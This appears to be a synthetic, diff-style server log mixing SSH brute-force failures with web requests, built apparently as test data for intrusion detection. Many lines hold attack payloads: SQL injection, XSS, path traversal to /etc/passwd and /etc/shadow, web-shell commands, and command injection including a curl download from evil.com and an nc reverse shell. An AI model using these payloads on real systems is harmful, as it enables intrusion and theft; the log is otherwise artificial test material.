+2024-12-15T23:50:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 164
+Dec 15 14:20:51 server1 sshd[12345]: Failed password for invalid user root from 185.220.101.46 port 29918 ssh2
+Dec 15 14:03:36 server1 sshd[12345]: Failed password for invalid user git from 10.0.0.100 port 11300 ssh2
+Dec 15 14:04:51 server1 sshd[12345]: Failed password for invalid user admin from 45.154.255.147 port 26234 ssh2
+Dec 15 14:12:48 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 57650 ssh2
+Dec 15 14:23:03 server1 sshd[12345]: Failed password for invalid user ftpuser from 185.220.101.46 port 13134 ssh2
+Dec 15 14:16:21 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 38243 ssh2
+Dec 15 14:01:24 server1 sshd[12345]: Failed password for invalid user ubuntu from 185.220.101.46 port 28283 ssh2
+Dec 15 19:10:00 server1 systemd[1]: Started Session 134 of user deploy.
+Dec 15 14:14:27 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+2024-12-15T13:30:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 329
+Dec 15 14:11:18 server1 sshd[12345]: Failed password for invalid user ubuntu from 10.0.0.100 port 46253 ssh2
+2024-12-15T18:05:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 53
+Dec 15 14:06:45 server1 sshd[12345]: Failed password for invalid user root from 185.220.101.46 port 41723 ssh2
+2024-12-15T19:03:40.000000+0800 192.168.100.50 - - "GET /ping.php?host=8.8.8.8;curl -O http://evil.com/backdoor HTTP/1.1" 200 221
+Dec 15 14:21:57 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+2024-12-15T10:05:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 116
+Dec 15 09:40:00 server1 systemd[1]: Started Session 20 of user deploy.
+Dec 15 14:08:24 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 31691 ssh2
+Dec 15 14:24:24 server1 sshd[12345]: Failed password for invalid user postgres from 103.35.74.12 port 44667 ssh2
+Dec 15 23:25:00 server1 systemd[1]: Started Session 185 of user deploy.
+Dec 15 14:15:48 server1 sshd[12345]: Failed password for invalid user admin from 10.0.0.100 port 40037 ssh2
+Dec 15 14:05:18 server1 sshd[12345]: Failed password for invalid user guest from 192.168.100.50 port 38776 ssh2
+2024-12-15T10:45:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 391
+2024-12-15T16:00:30.000000+0800 185.220.101.46 - - "GET /search.php?q=%3Csvg onload=alert(1)%3E HTTP/1.1" 200 789
+Dec 15 14:19:48 server1 sshd[12345]: Failed password for invalid user mysql from 10.0.0.100 port 43651 ssh2
+2024-12-15T22:15:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 443
+Dec 15 22:25:00 server1 systemd[1]: Started Session 173 of user deploy.
+Dec 15 14:12:39 server1 sshd[12345]: Failed password for invalid user administrator from 91.121.87.18 port 43377 ssh2
+Dec 15 14:00:00 server1 sshd[12345]: Failed password for invalid user deploy from 91.121.87.18 port 34352 ssh2
+2024-12-15T10:20:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 104
+2024-12-15T12:50:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 119
+Dec 15 14:15:42 server1 sshd[12345]: Failed password for invalid user admin from 192.168.100.50 port 44663 ssh2
+2024-12-15T20:05:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 114
+2024-12-15T15:03:30.000000+0800 185.220.101.46 - - "GET /products.php?id=' OR 1=1-- HTTP/1.1" 500 4784
+Dec 15 14:08:27 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+2024-12-15T16:01:15.000000+0800 10.0.0.100 - - "GET /search.php?q=%3Cbody onload=alert(1)%3E HTTP/1.1" 200 724
+Dec 15 14:19:39 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 14419 ssh2
+Dec 15 14:22:48 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 46229 ssh2
+Dec 15 14:08:48 server1 sshd[12345]: Failed password for invalid user ubuntu from 185.220.101.46 port 27135 ssh2
+Dec 15 14:03:42 server1 sshd[12345]: Failed password for invalid user deploy from 103.35.74.12 port 39671 ssh2
+Dec 15 14:17:03 server1 sshd[12345]: Failed password for invalid user ubuntu from 10.0.0.100 port 22001 ssh2
+Dec 15 20:50:00 server1 sudo[9475]: new user with name 'hacker', UID 1001; TTY=pts/0; USER=root; COMMAND=/bin/bash
+Dec 15 14:15:15 server1 sshd[12345]: Failed password for invalid user guest from 103.35.74.12 port 23928 ssh2
+Dec 15 14:23:33 server1 sshd[12345]: Failed password for invalid user guest from 91.121.87.18 port 49128 ssh2
+Dec 15 14:09:03 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 18158 ssh2
+Dec 15 23:10:00 server1 systemd[1]: Started Session 182 of user deploy.
+Dec 15 14:19:45 server1 sshd[12345]: Failed password for invalid user www-data from 185.220.101.46 port 48142 ssh2
+Dec 15 14:23:09 server1 sshd[12345]: Failed password for invalid user administrator from 185.220.101.46 port 45932 ssh2
+Dec 15 11:55:00 server1 systemd[1]: Started Session 47 of user deploy.
+2024-12-15T17:03:24.000000+0800 103.35.74.12 - - "GET /files/..%2f..%2fetc%2fshadow HTTP/1.1" 403 2256
+Dec 15 14:10:06 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 38990 ssh2
+Dec 15 14:15:00 server1 sshd[12345]: Failed password for invalid user admin from 10.0.0.100 port 11959 ssh2
+Dec 15 14:09:51 server1 sshd[12345]: Failed password for invalid user guest from 192.168.100.50 port 12711 ssh2
+2024-12-15T15:00:40.000000+0800 10.0.0.100 - - "POST /products.php?id=1 OR 1=1 HTTP/1.1" 403 957
+Dec 15 14:13:42 server1 sshd[12345]: Failed password for invalid user test from 192.168.100.50 port 28018 ssh2
+Dec 15 14:12:24 server1 sshd[12345]: Failed password for invalid user admin from 91.121.87.18 port 11663 ssh2
+Dec 15 14:14:45 server1 sshd[12345]: Failed password for invalid user www-data from 91.121.87.18 port 20417 ssh2
+Dec 15 14:12:03 server1 sshd[12345]: Failed password for invalid user ubuntu from 10.0.0.100 port 39891 ssh2
+Dec 15 14:21:24 server1 sshd[12345]: Failed password for invalid user admin from 103.35.74.12 port 34483 ssh2
+Dec 15 14:10:21 server1 sshd[12345]: Failed password for invalid user guest from 10.0.0.100 port 50302 ssh2
+Dec 15 14:23:42 server1 sshd[12345]: Failed password for invalid user git from 45.154.255.147 port 42434 ssh2
+Dec 15 14:18:39 server1 sshd[12345]: Failed password for invalid user root from 10.0.0.100 port 45903 ssh2
+Dec 15 14:17:33 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 21174 ssh2
+Dec 15 14:19:51 server1 sshd[12345]: Failed password for invalid user git from 10.0.0.100 port 38051 ssh2
+2024-12-15T14:50:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 114
+2024-12-15T13:20:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 183
+2024-12-15T18:04:00.000000+0800 10.0.0.100 - - "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 130
+Dec 15 14:02:57 server1 sshd[12345]: Connection closed by 91.121.87.18 port 22 [preauth]
+Dec 15 14:01:12 server1 sshd[12345]: Failed password for invalid user ubuntu from 185.220.101.46 port 53075 ssh2
+2024-12-15T15:08:10.000000+0800 192.168.100.50 - - "GET /products.php?id=1' ORDER BY 10-- HTTP/1.1" 500 1798
+Dec 15 14:13:27 server1 sshd[12345]: Connection closed by 91.121.87.18 port 22 [preauth]
+Dec 15 14:02:39 server1 sshd[12345]: Failed password for invalid user oracle from 185.220.101.46 port 58455 ssh2
+Dec 15 14:03:15 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 26620 ssh2
+Dec 15 14:10:33 server1 sshd[12345]: Failed password for invalid user ubuntu from 192.168.100.50 port 15200 ssh2
+Dec 15 14:24:54 server1 sshd[12345]: Failed password for invalid user ubuntu from 10.0.0.100 port 11696 ssh2
+2024-12-16T00:15:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 468
+Dec 15 14:18:12 server1 sshd[12345]: Failed password for invalid user postgres from 192.168.100.50 port 16995 ssh2
+2024-12-15T18:35:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 174
+2024-12-15T12:35:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 94
+Dec 15 14:20:27 server1 sshd[12345]: Connection closed by 10.0.0.100 port 22 [preauth]
+2024-12-15T19:03:00.000000+0800 185.220.101.46 - - "GET /ping.php?host=8.8.8.8`whoami` HTTP/1.1" 200 1825
+Dec 15 14:24:51 server1 sshd[12345]: Failed password for invalid user guest from 45.154.255.147 port 33976 ssh2
+2024-12-15T18:06:30.000000+0800 10.0.0.100 - - "GET /uploads/shell.php?cmd=pwd HTTP/1.1" 200 395
+Dec 15 14:13:33 server1 sshd[12345]: Failed password for invalid user test from 91.121.87.18 port 27818 ssh2
+Dec 15 14:10:45 server1 sshd[12345]: Failed password for invalid user deploy from 91.121.87.18 port 30199 ssh2
+2024-12-15T23:00:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 580
+Dec 15 14:01:42 server1 sshd[12345]: Failed password for invalid user root from 45.154.255.147 port 36727 ssh2
+2024-12-15T20:35:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 192
+Dec 15 14:22:21 server1 sshd[12345]: Failed password for invalid user test from 185.220.101.46 port 53815 ssh2
+Dec 15 14:08:57 server1 sshd[12345]: Connection closed by 103.35.74.12 port 22 [preauth]
+Dec 15 14:22:30 server1 sshd[12345]: Failed password for invalid user root from 10.0.0.100 port 37021 ssh2
+Dec 15 14:15:57 server1 sshd[12345]: Connection closed by 91.121.87.18 port 22 [preauth]
+Dec 15 20:30:00 server1 sudo[2181]: Successful su for root by www-data; TTY=pts/0; USER=root; COMMAND=/bin/bash
+Dec 15 14:24:45 server1 sshd[12345]: Failed password for invalid user test from 185.220.101.46 port 21624 ssh2
+Dec 15 14:21:27 server1 sshd[12345]: Connection closed by 10.0.0.100 port 22 [preauth]
+Dec 15 14:02:33 server1 sshd[12345]: Failed password for invalid user deploy from 103.35.74.12 port 41101 ssh2
+2024-12-15T15:00:50.000000+0800 91.121.87.18 - - "POST /products.php?id=admin'-- HTTP/1.1" 500 133
+2024-12-15T18:00:00.000000+0800 10.0.0.100 - - "POST /upload.php HTTP/1.1" 200 1093
+Dec 15 14:18:36 server1 sshd[12345]: Failed password for invalid user postgres from 103.35.74.12 port 22505 ssh2
+Dec 15 10:40:00 server1 systemd[1]: Started Session 32 of user deploy.
+2024-12-15T13:45:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 600
+Dec 15 12:10:00 server1 systemd[1]: Started Session 50 of user deploy.
+2024-12-15T17:02:24.000000+0800 103.35.74.12 - - "GET /files//../../etc/passwd HTTP/1.1" 404 2644
+Dec 15 14:16:48 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 44771 ssh2
+2024-12-15T17:00:00.000000+0800 91.121.87.18 - - "GET /files/../../etc/passwd HTTP/1.1" 200 2758
+Dec 15 14:19:57 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+Dec 15 14:23:06 server1 sshd[12345]: Failed password for invalid user administrator from 91.121.87.18 port 46106 ssh2
+Dec 15 14:13:00 server1 sshd[12345]: Failed password for invalid user administrator from 10.0.0.100 port 31586 ssh2
+Dec 15 14:00:42 server1 sshd[12345]: Failed password for invalid user postgres from 103.35.74.12 port 15879 ssh2
+Dec 15 09:25:00 server1 systemd[1]: Started Session 17 of user deploy.
+Dec 15 14:06:27 server1 sshd[12345]: Connection closed by 103.35.74.12 port 22 [preauth]
+Dec 15 14:15:36 server1 sshd[12345]: Failed password for invalid user oracle from 185.220.101.46 port 48366 ssh2
+2024-12-15T15:05:00.000000+0800 185.220.101.46 - - "POST /products.php?id=' OR '1'='1 HTTP/1.1" 200 4603
+Dec 15 14:06:39 server1 sshd[12345]: Failed password for invalid user www-data from 91.121.87.18 port 31593 ssh2
+Dec 15 14:03:06 server1 sshd[12345]: Failed password for invalid user admin from 91.121.87.18 port 21753 ssh2
+Dec 15 14:01:36 server1 sshd[12345]: Failed password for invalid user ftpuser from 185.220.101.46 port 42998 ssh2
+Dec 15 14:00:15 server1 sshd[12345]: Failed password for invalid user test from 10.0.0.100 port 13928 ssh2
+2024-12-15T15:05:20.000000+0800 103.35.74.12 - - "GET /products.php?id=UNION SELECT username,password FROM users-- HTTP/1.1" 500 3059
+Dec 15 09:10:00 server1 systemd[1]: Started Session 14 of user deploy.
+2024-12-15T16:02:15.000000+0800 103.35.74.12 - - "GET /search.php?q=%3Cimg src=x onerror=alert(1)%3E HTTP/1.1" 200 754
+Dec 15 14:10:00 server1 systemd[1]: Started Session 74 of user deploy.
+Dec 15 14:00:39 server1 sshd[12345]: Failed password for invalid user guest from 192.168.100.50 port 23080 ssh2
+Dec 15 14:07:00 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 37462 ssh2
+Dec 15 14:09:18 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 58818 ssh2
+Dec 15 14:14:03 server1 sshd[12345]: Failed password for invalid user postgres from 103.35.74.12 port 45339 ssh2
+2024-12-15T15:06:30.000000+0800 103.35.74.12 - - "GET /products.php?id=1' ORDER BY 10-- HTTP/1.1" 500 2265
+Dec 15 14:09:12 server1 sshd[12345]: Failed password for invalid user git from 91.121.87.18 port 49851 ssh2
+2024-12-15T15:07:00.000000+0800 185.220.101.46 - - "POST /products.php?id=UNION SELECT username,password FROM users-- HTTP/1.1" 403 1039
+2024-12-15T12:45:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 356
+Dec 15 14:22:33 server1 sshd[12345]: Failed password for invalid user ubuntu from 10.0.0.100 port 12052 ssh2
+Dec 15 14:23:51 server1 sshd[12345]: Failed password for invalid user test from 91.121.87.18 port 58969 ssh2
+Dec 15 14:00:24 server1 sshd[12345]: Failed password for invalid user mysql from 91.121.87.18 port 20524 ssh2
+Dec 15 14:05:42 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 48672 ssh2
+Dec 15 22:40:00 server1 systemd[1]: Started Session 176 of user deploy.
+Dec 15 14:09:57 server1 sshd[12345]: Connection closed by 103.35.74.12 port 22 [preauth]
+2024-12-15T16:05:00.000000+0800 185.220.101.46 - - "GET /search.php?q=%3Ciframe src='javascript:alert(1)'%3E%3C/iframe%3E HTTP/1.1" 200 954
+Dec 15 14:16:45 server1 sshd[12345]: Failed password for invalid user mysql from 45.154.255.147 port 35222 ssh2
+Dec 15 21:40:00 server1 systemd[1]: Started Session 164 of user deploy.
+Dec 15 08:10:00 server1 systemd[1]: Started Session 2 of user deploy.
+Dec 15 14:14:06 server1 sshd[12345]: Failed password for invalid user root from 192.168.100.50 port 33478 ssh2
+Dec 15 14:21:03 server1 sshd[12345]: Failed password for invalid user root from 103.35.74.12 port 15679 ssh2
+2024-12-15T18:30:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 831
+Dec 15 14:11:48 server1 sshd[12345]: Failed password for invalid user git from 91.121.87.18 port 59844 ssh2
+2024-12-15T17:03:12.000000+0800 103.35.74.12 - - "GET /files/%2e%2e/etc/passwd HTTP/1.1" 404 1993
+2024-12-15T16:05:45.000000+0800 185.220.101.46 - - "GET /search.php?q=%3Csvg%3E%3Cx%3E%3Canimate onbegin=alert(1) attributeName=x%3E%3C/svg%3E HTTP/1.1" 200 399
+2024-12-15T15:06:10.000000+0800 91.121.87.18 - - "GET /products.php?id=1; EXEC xp_cmdshell('whoami')-- HTTP/1.1" 500 3394
+Dec 15 14:08:51 server1 sshd[12345]: Failed password for invalid user postgres from 91.121.87.18 port 45950 ssh2
+Dec 15 14:23:12 server1 sshd[12345]: Failed password for invalid user mysql from 103.35.74.12 port 50583 ssh2
+2024-12-15T16:05:30.000000+0800 91.121.87.18 - - "GET /search.php?q=%3Cinput onfocus=alert(1) autofocus%3E HTTP/1.1" 200 568
+Dec 15 14:20:54 server1 sshd[12345]: Failed password for invalid user test from 192.168.100.50 port 12528 ssh2
+Dec 15 14:08:03 server1 sshd[12345]: Failed password for invalid user guest from 91.121.87.18 port 14264 ssh2
+2024-12-15T09:50:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 190
+Dec 15 14:24:09 server1 sshd[12345]: Failed password for invalid user administrator from 103.35.74.12 port 51851 ssh2
+Dec 15 20:10:00 server1 systemd[1]: Started Session 146 of user deploy.
+Dec 15 14:03:27 server1 sshd[12345]: Connection closed by 45.154.255.147 port 22 [preauth]
+Dec 15 14:09:09 server1 sshd[12345]: Failed password for invalid user www-data from 10.0.0.100 port 59683 ssh2
+2024-12-15T18:20:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 91
+Dec 15 14:24:27 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+2024-12-15T13:50:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 161
+Dec 15 15:55:00 server1 systemd[1]: Started Session 95 of user deploy.
+Dec 15 14:18:33 server1 sshd[12345]: Failed password for invalid user administrator from 91.121.87.18 port 49169 ssh2
+Dec 15 09:55:00 server1 systemd[1]: Started Session 23 of user deploy.
+2024-12-15T16:30:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 206
+Dec 15 14:05:21 server1 sshd[12345]: Failed password for invalid user git from 192.168.100.50 port 10720 ssh2
+Dec 15 14:11:39 server1 sshd[12345]: Failed password for invalid user ubuntu from 103.35.74.12 port 46052 ssh2
+Dec 15 20:20:00 server1 sudo[9671]: command not allowed; TTY=pts/0; USER=root; COMMAND=/bin/bash
+Dec 15 14:11:06 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 45898 ssh2
+Dec 15 14:04:57 server1 sshd[12345]: Connection closed by 91.121.87.18 port 22 [preauth]
+2024-12-15T15:02:20.000000+0800 192.168.100.50 - - "POST /products.php?id=1 OR 1=1 HTTP/1.1" 200 3650
+Dec 15 14:00:12 server1 sshd[12345]: Failed password for invalid user admin from 91.121.87.18 port 39664 ssh2
+Dec 15 14:16:12 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 21239 ssh2
+Dec 15 14:15:33 server1 sshd[12345]: Failed password for invalid user admin from 103.35.74.12 port 22559 ssh2
+2024-12-15T15:00:30.000000+0800 185.220.101.46 - - "POST /products.php?id='; DROP TABLE users-- HTTP/1.1" 500 1360
+Dec 15 14:04:24 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 50848 ssh2
+Dec 15 14:03:00 server1 sshd[12345]: Failed password for invalid user oracle from 103.35.74.12 port 24564 ssh2
+2024-12-15T18:08:00.000000+0800 91.121.87.18 - - "GET /uploads/shell.php?cmd=uname -a HTTP/1.1" 200 152
+2024-12-15T17:01:12.000000+0800 45.154.255.147 - - "GET /files/..;/..;/etc/passwd HTTP/1.1" 403 899
+Dec 15 10:10:00 server1 systemd[1]: Started Session 26 of user deploy.
+Dec 15 14:05:51 server1 sshd[12345]: Failed password for invalid user ftpuser from 185.220.101.46 port 51125 ssh2
+2024-12-15T20:50:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 96
+Dec 15 20:00:00 server1 sudo[1363]: authentication failure; TTY=pts/0; USER=root; COMMAND=/bin/bash
+Dec 15 14:10:30 server1 sshd[12345]: Failed password for invalid user postgres from 10.0.0.100 port 29563 ssh2
+Dec 15 14:11:57 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+2024-12-15T19:00:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 928
+Dec 15 14:06:24 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 48908 ssh2
+Dec 15 14:14:12 server1 sshd[12345]: Failed password for invalid user deploy from 185.220.101.46 port 57766 ssh2
+Dec 15 14:05:24 server1 sshd[12345]: Failed password for invalid user test from 91.121.87.18 port 43802 ssh2
+Dec 15 14:12:27 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+Dec 15 14:00:06 server1 sshd[12345]: Failed password for invalid user administrator from 185.220.101.46 port 31318 ssh2
+Dec 15 18:10:00 server1 systemd[1]: Started Session 122 of user deploy.
+Dec 15 14:12:12 server1 sshd[12345]: Failed password for invalid user administrator from 45.154.255.147 port 44099 ssh2
+Dec 15 14:09:45 server1 sshd[12345]: Failed password for invalid user postgres from 91.121.87.18 port 10949 ssh2
+Dec 15 14:17:18 server1 sshd[12345]: Failed password for invalid user admin from 192.168.100.50 port 44972 ssh2
+2024-12-15T19:02:40.000000+0800 185.220.101.46 - - "GET /ping.php?host=8.8.8.8|ls /tmp HTTP/1.1" 200 4829
+Dec 15 14:13:06 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 32345 ssh2
+2024-12-15T09:35:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 171
+2024-12-15T17:01:00.000000+0800 192.168.100.50 - - "GET /files//../../etc/passwd HTTP/1.1" 403 1161
+Dec 15 14:23:57 server1 sshd[12345]: Connection closed by 103.35.74.12 port 22 [preauth]
+2024-12-15T19:04:00.000000+0800 10.0.0.100 - - "GET /ping.php?host=8.8.8.8|nc -e /bin/bash 192.168.1.1 4444 HTTP/1.1" 200 2804
+2024-12-15T14:05:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 154
+Dec 15 14:18:54 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 18308 ssh2
+2024-12-15T18:09:00.000000+0800 91.121.87.18 - - "GET /uploads/shell.php?cmd=pwd HTTP/1.1" 200 436
+Dec 15 14:01:09 server1 sshd[12345]: Failed password for invalid user oracle from 103.35.74.12 port 47791 ssh2
+Dec 15 16:55:00 server1 systemd[1]: Started Session 107 of user deploy.
+Dec 15 14:07:24 server1 sshd[12345]: Failed password for invalid user postgres from 103.35.74.12 port 22738 ssh2
+2024-12-15T15:01:50.000000+0800 10.0.0.100 - - "GET /products.php?id=' OR 1=1-- HTTP/1.1" 403 3646
+2024-12-15T15:05:40.000000+0800 91.121.87.18 - - "POST /products.php?id=1 OR 1=1 HTTP/1.1" 200 1433
+2024-12-15T18:01:00.000000+0800 192.168.100.50 - - "GET /uploads/shell.php?cmd=cat /etc/passwd HTTP/1.1" 200 119
+2024-12-15T18:04:30.000000+0800 103.35.74.12 - - "GET /uploads/shell.php?cmd=ls -la HTTP/1.1" 200 440
+Dec 15 14:11:00 server1 sshd[12345]: Failed password for invalid user ubuntu from 192.168.100.50 port 43082 ssh2
+Dec 15 14:21:18 server1 sshd[12345]: Failed password for invalid user deploy from 45.154.255.147 port 34370 ssh2
+Dec 15 14:00:48 server1 sshd[12345]: Failed password for invalid user postgres from 91.121.87.18 port 46013 ssh2
+2024-12-15T17:00:24.000000+0800 45.154.255.147 - - "GET /files/%2e%2e/etc/passwd HTTP/1.1" 200 1902
+Dec 15 14:07:51 server1 sshd[12345]: Failed password for invalid user www-data from 91.121.87.18 port 33976 ssh2
+Dec 15 14:07:33 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 43523 ssh2
+Dec 15 14:00:27 server1 sshd[12345]: Connection closed by 10.0.0.100 port 22 [preauth]
+Dec 15 14:15:12 server1 sshd[12345]: Failed password for invalid user mysql from 45.154.255.147 port 48902 ssh2
+2024-12-15T09:00:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 217
+2024-12-15T16:02:45.000000+0800 192.168.100.50 - - "GET /search.php?q=javascript:alert(document.cookie) HTTP/1.1" 200 312
+Dec 15 11:25:00 server1 systemd[1]: Started Session 41 of user deploy.
+Dec 16 00:25:00 server1 systemd[1]: Started Session 197 of user deploy.
+Dec 15 14:12:21 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 27747 ssh2
+2024-12-15T16:00:00.000000+0800 91.121.87.18 - - "GET /search.php?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1" 200 483
+2024-12-15T15:02:30.000000+0800 45.154.255.147 - - "POST /products.php?id=admin'-- HTTP/1.1" 200 916
+Dec 15 14:01:27 server1 sshd[12345]: Connection closed by 103.35.74.12 port 22 [preauth]
+Dec 15 14:23:00 server1 sshd[12345]: Failed password for invalid user test from 91.121.87.18 port 27241 ssh2
+Dec 15 14:16:39 server1 sshd[12345]: Failed password for invalid user mysql from 192.168.100.50 port 40743 ssh2
+2024-12-15T23:15:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 604
+Dec 15 14:16:06 server1 sshd[12345]: Failed password for invalid user ubuntu from 45.154.255.147 port 40071 ssh2
+Dec 15 14:14:51 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 24722 ssh2
+Dec 15 14:13:48 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 57440 ssh2
+Dec 15 14:19:33 server1 sshd[12345]: Failed password for invalid user test from 185.220.101.46 port 26551 ssh2
+Dec 15 14:17:24 server1 sshd[12345]: Failed password for invalid user root from 10.0.0.100 port 51343 ssh2
+Dec 15 14:22:06 server1 sshd[12345]: Failed password for invalid user deploy from 91.121.87.18 port 38477 ssh2
+Dec 15 14:18:24 server1 sshd[12345]: Failed password for invalid user ftpuser from 91.121.87.18 port 56581 ssh2
+2024-12-15T10:50:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 62
+Dec 15 14:23:36 server1 sshd[12345]: Failed password for invalid user test from 192.168.100.50 port 47393 ssh2
+2024-12-15T14:45:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 750
+Dec 15 14:17:39 server1 sshd[12345]: Failed password for invalid user git from 10.0.0.100 port 58796 ssh2
+2024-12-15T19:45:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 984
+Dec 15 14:24:39 server1 sshd[12345]: Failed password for invalid user guest from 185.220.101.46 port 18440 ssh2
+Dec 15 14:21:51 server1 sshd[12345]: Failed password for invalid user test from 45.154.255.147 port 45883 ssh2
+Dec 15 14:13:12 server1 sshd[12345]: Failed password for invalid user guest from 192.168.100.50 port 24657 ssh2
+Dec 15 15:10:00 server1 systemd[1]: Started Session 86 of user deploy.
+Dec 15 19:40:00 server1 systemd[1]: Started Session 140 of user deploy.
+Dec 15 14:00:51 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 41663 ssh2
+Dec 15 14:04:48 server1 sshd[12345]: Failed password for invalid user www-data from 91.121.87.18 port 10879 ssh2
+Dec 15 14:12:54 server1 sshd[12345]: Failed password for invalid user administrator from 185.220.101.46 port 28981 ssh2
+Dec 15 21:10:00 server1 systemd[1]: Started Session 158 of user deploy.
+Dec 15 14:04:12 server1 sshd[12345]: Failed password for invalid user admin from 91.121.87.18 port 43041 ssh2
+Dec 15 14:03:12 server1 sshd[12345]: Failed password for invalid user guest from 91.121.87.18 port 27434 ssh2
+2024-12-15T15:00:00.000000+0800 10.0.0.100 - - "GET /products.php?id=' OR '1'='1 HTTP/1.1" 403 4116
+Dec 15 14:04:18 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 40121 ssh2
+Dec 15 14:06:12 server1 sshd[12345]: Failed password for invalid user postgres from 45.154.255.147 port 20350 ssh2
+2024-12-15T18:45:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 372
+2024-12-15T15:04:10.000000+0800 192.168.100.50 - - "GET /products.php?id=admin'-- HTTP/1.1" 200 985
+2024-12-15T10:35:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 117
+Dec 15 14:05:33 server1 sshd[12345]: Failed password for invalid user guest from 45.154.255.147 port 55619 ssh2
+2024-12-15T16:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 460
+Dec 15 14:16:33 server1 sshd[12345]: Failed password for invalid user admin from 91.121.87.18 port 54772 ssh2
+Dec 15 14:20:06 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 52039 ssh2
+2024-12-15T15:04:20.000000+0800 192.168.100.50 - - "POST /products.php?id=' OR ''=' HTTP/1.1" 403 1613
+2024-12-15T18:15:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 617
+2024-12-16T00:00:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 677
+Dec 15 15:25:00 server1 systemd[1]: Started Session 89 of user deploy.
+Dec 15 14:05:57 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+2024-12-15T11:15:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 841
+Dec 15 14:14:42 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 13037 ssh2
+Dec 15 14:20:57 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+Dec 15 13:55:00 server1 systemd[1]: Started Session 71 of user deploy.
+2024-12-15T19:02:20.000000+0800 103.35.74.12 - - "GET /ping.php?host=8.8.8.8;cat /etc/passwd HTTP/1.1" 200 4599
+Dec 15 14:13:57 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+2024-12-15T23:35:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 76
